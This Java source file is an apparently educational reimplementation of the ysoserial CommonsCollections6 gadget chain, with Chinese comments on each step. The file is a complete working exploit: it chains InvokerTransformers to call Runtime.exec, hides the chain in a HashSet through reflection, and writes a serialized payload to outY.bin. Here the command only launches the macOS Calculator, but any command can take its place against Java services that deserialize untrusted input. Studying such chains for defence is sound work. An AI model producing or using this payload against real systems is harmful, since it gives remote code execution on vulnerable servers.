import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * @author yhy
 * @date 2021/6/27 20:47
 * @github https://github.com/yhy0
 * ysoserial
 */
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/

public class CC6_Y {
    public static void main(String[] args) throws Exception {
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
                new ConstantTransformer(1), // 隐藏错误信息
        };
        //将transformers数组存入 ChainedTransformer 这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        //使用 LazyMap
        Map outerMap = LazyMap.decorate(innerMap,transformerChain);

        // 上面还是使用CC1构造的，不变， 这里创建 TiedMapEntry 测试一下
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"yhy");
//        tiedMapEntry.hashCode();

        // HashSet

        // 指定初始容量为1
        HashSet hashSet = new HashSet(1);
        hashSet.add("yhy");
        // 反射获取HashSet中map的值
        Field map =  Class.forName("java.util.HashSet").getDeclaredField("map");
        // 取消访问限制检查
        map.setAccessible(true);
        // 获取HashSet中map的值
        HashMap hashSetMap = (HashMap) map.get(hashSet);

        // 反射获取 HashMap 中 table 的值
        Field table =  Class.forName("java.util.HashMap").getDeclaredField("table");
        // 取消访问限制检查
        table.setAccessible(true);
        // 获取 HashMap 中 table 的值
        Object[] hashMapTable = (Object[]) table.get(hashSetMap);

        Object node = hashMapTable[0];
        if(node == null) {
            node = hashMapTable[1];
        }

        // 将 key 设为 tiedMapEntry
        Field key =  node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node, tiedMapEntry);


        // 序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("outY.bin"));
        oos.writeObject(hashSet);

        // 反序列化读取 out.bin 文件
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("outY.bin"));
        ois.readObject();

    }
}
